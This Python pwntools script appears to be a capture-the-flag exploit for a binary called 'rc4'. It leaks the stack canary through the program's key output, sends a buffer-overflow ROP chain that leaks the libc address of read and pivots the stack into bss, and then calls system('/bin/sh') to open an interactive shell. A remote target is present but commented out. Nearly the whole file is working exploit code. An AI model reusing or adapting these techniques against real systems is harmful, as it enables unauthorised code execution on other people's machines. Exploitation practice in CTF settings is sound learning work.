#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
import sys
context.binary = "./rc4"

elf = ELF("./rc4", checksec = False)
local = sys.argv[1] == "l"
if local:
    io = process("./rc4")
    libc = elf.libc
else:
    #  io = remote("118.31.17.25", 20011)
    io = process("./rc4", env = {"LD_PRELOAD": "./libc.so.6"})
    libc = ELF("./libc.so.6", checksec = False)

#  context.log_level = "debug"
def static_key():
    io.sendlineafter("> ", "a")
    io.sendlineafter("> ", "b")
    return io.recvuntil("Crypto Test!", drop = True).strip()

def rop(canary):
    prbp = 0x0000000000400920
    prdi = 0x0000000000401283
    leaveret = 0x0000000000400b6e
    base = elf.bss() + 0x300

    io.sendlineafter("> ", "b")
    sleep(0.01)
    payload  = flat(cyclic(264), canary, base - 8)
    payload += flat(prdi, elf.got['read'], elf.plt['puts'])
    payload += flat(prdi, base, elf.plt['gets'])
    payload += flat(leaveret)
    io.sendline(payload)
    sleep(0.01)

    io.sendlineafter("> ", "d")
    io.sendlineafter("> ", "n")

if __name__ == "__main__":
#  with context.quiet:
    #  raw_input("DEBUG: ")
    static_key()
    canary  = static_key()[-16: ].decode('hex')
    print("canary -> " + canary.encode('hex'))

    #  raw_input("DEBUG: ")
    rop(canary)
    libc.address = u64(io.recvuntil("\x7f")[-6: ] + '\0\0') - libc.sym['read']
    success("libc -> {:#x}".format(libc.address))

    prdi = 0x0000000000401283
    payload = flat(prdi, next(libc.search("/bin/sh")), libc.sym['system'])
    io.sendline(payload)

    io.interactive()
